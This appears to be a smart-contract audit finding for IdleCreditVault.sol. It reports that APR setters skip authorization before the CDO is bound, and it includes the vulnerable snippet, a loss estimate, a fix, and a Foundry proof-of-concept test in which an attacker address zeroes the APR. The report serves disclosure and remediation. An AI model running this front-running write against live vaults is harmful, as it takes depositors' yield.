### Title
Unauthenticated bootstrap callers can rewrite the credit-vault APR and steal epoch yield - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol))

### Summary

`IdleCreditVault.setAprs`, `setAprsWithBuffer`, and `setApr` skip caller authorization entirely while `idleCDO == address(0)`. The intended ordering is visible in the factory: configure APR first, then bind the CDO, but nothing constrains that intermediate write to the owner or manager. An unprivileged account can therefore set `lastApr` to zero between strategy initialization and CDO wiring. The first epoch then accrues no borrower interest even though LPs supplied principal, permanently transferring the contractual epoch yield from LPs to the borrower. [1](#0-0) [2](#0-1) 

### Finding Description

After CDO wiring, `setApr` correctly restricts callers to the CDO or manager. Before wiring, however, the guard is bypassed completely:

```solidity
address _cdo = idleCDO;
if (_cdo != address(0)) {
  if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();
}
```

Thus any EOA can call `setAprs(0, 0)` or `setApr(0)` during the deployment/configuration window. `startEpoch` later uses `lastApr` through `_calcInterest(getContractValue())` to compute `expectedEpochInterest`, so an overwritten APR of zero produces a zero borrower repayment obligation. [3](#0-2) 

This is the credit-vault analog of the reported missing write-scope enforcement: an identity without the write role can perform a control-plane mutation that terminates the economic purpose of a session/epoch.

### Impact Explanation

For a principal `P`, intended APR `apr`, epoch duration `d`, and buffer `b`, the stolen first-epoch yield is approximately:

```text
loss = P * apr * (d + b) / YEAR
```

For example, with 1,000,000 USDC, a 10% APR, a 30-day epoch, and a 1-day buffer, setting APR to zero removes approximately 849 USDC of expected LP yield. The borrower keeps that amount because `expectedEpochInterest` is zero before funds are sent. LPs cannot recover that yield later: `stopEpoch` prices only what was calculated as expected and does not reconstruct the intended bootstrap APR. [4](#0-3) 

A maliciously inflated APR can alternatively make honest borrower repayment fail and route the vault into the default path, freezing normal epoch settlement pending recovery. [5](#0-4) 

### Likelihood Explanation

Likelihood is lower than a permanently exposed mutation because the attacker must act between strategy initialization and `setWhitelistedCDO`. That ordering is explicitly supported by the code and factory comments, and it can occur in manual deployment, implementation replacement, migration, or any non-atomic configuration flow. Once `idleCDO` is set, the same attack reverts.

No privileged role needs to be malicious. The attacker only monitors deployment/configuration transactions and submits the unauthorized APR write before the CDO is bound.

### Recommendation

Remove the unauthenticated bootstrap path. Require `msg.sender == owner() || msg.sender == manager` while `idleCDO == address(0)`, and retain `msg.sender == idleCDO || msg.sender == manager` afterward:

```solidity
function setApr(uint256 _apr) public {
  address _cdo = idleCDO;
  if (
    msg.sender != manager &&
    msg.sender != (_cdo == address(0) ? owner() : _cdo)
  ) {
    revert NotAllowed();
  }

  uint256 _maxApr = maxApr;
  if (_maxApr != 0 && _apr > _maxApr) revert NotAllowed();
  lastApr = _apr;
}
```

Apply the same authorization rule transitively to `setAprs` and `setAprsWithBuffer`. Deployment scripts should also bind the CDO atomically or verify the configured APR immediately after `setWhitelistedCDO`.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {IdleCDOCreditVault} from "../../contracts/IdleCDOCreditVault.sol";
import {IdleCreditVault} from "../../contracts/strategies/idle/IdleCreditVault.sol";

contract TestUnderlying is ERC20 {
  constructor() ERC20("Underlying", "UND") {}

  function decimals() public pure override returns (uint8) {
    return 6;
  }

  function mint(address to, uint256 amount) external {
    _mint(to, amount);
  }
}

contract IdleCreditVaultBootstrapAuthTest is Test {
  uint256 constant ONE = 1e6;
  uint256 constant FULL_ALLOC = 100_000;

  TestUnderlying underlying;
  IdleCreditVault strategy;
  IdleCDOCreditVault cdo;

  address proxyAdmin = address(0xA11CE);
  address manager = address(0xBEEF);
  address borrower = address(0xB0B);
  address attacker = address(0xBAD);
  address lp = address(0xCAFE);

  function setUp() external {
    underlying = new TestUnderlying();

    IdleCreditVault strategyImpl = new IdleCreditVault();
    strategy = IdleCreditVault(address(new TransparentUpgradeableProxy(
      address(strategyImpl),
      proxyAdmin,
      abi.encodeWithSelector(
        IdleCreditVault.initialize.selector,
        address(underlying),
        address(this),
        manager,
        borrower,
        "Borrower",
        10e18 // intended APR
      )
    )));

    IdleCDOCreditVault cdoImpl = new IdleCDOCreditVault();
    cdo = IdleCDOCreditVault(address(new TransparentUpgradeableProxy(
      address(cdoImpl),
      proxyAdmin,
      abi.encodeWithSelector(
        IdleCDOCreditVault.initialize.selector,
        10_000_000 * ONE,
        address(underlying),
        address(this),
        address(this),
        address(0),
        address(strategy),
        FULL_ALLOC
      )
    )));
  }

  function testUnprivilegedBootstrapCallerCanEraseFirstEpochYield() external {
    // The CDO has not been bound yet, so the authorization check is skipped.
    vm.prank(attacker);
    strategy.setAprs(0, 0);

    assertEq(strategy.lastApr(), 0);
    assertEq(strategy.unscaledApr(), 0);

    // Honest owner completes the intended configuration afterward.
    strategy.setWhitelistedCDO(address(cdo));
    cdo.setEpochParams(30 days, 1 days);

    uint256 principal = 1_000_000 * ONE;
    underlying.mint(lp, principal);

    vm.startPrank(lp);
    underlying.approve(address(cdo), principal);
    cdo.depositAA(principal);
    vm.stopPrank();

    cdo.startEpoch();
    assertEq(underlying.balanceOf(borrower), principal);

    vm.warp(block.timestamp + 31 days);
    vm.prank(borrower);
    underlying.approve(address(cdo), type(uint256).max);

    cdo.stopEpoch(10e18, 0);

    // With the intended 10% APR, the epoch would have accrued a positive interest
    // obligation. The unauthorized write made it zero, so the borrower retains it.
    assertEq(cdo.lastEpochInterest(), 0);
    assertEq(strategy.lastApr(), 10e18); // next-epoch APR set by stopEpoch
  }
}
```

The decisive assertion is the unauthorized `setAprs(0, 0)` before `setWhitelistedCDO`; the following epoch demonstrates the resulting zero interest obligation.
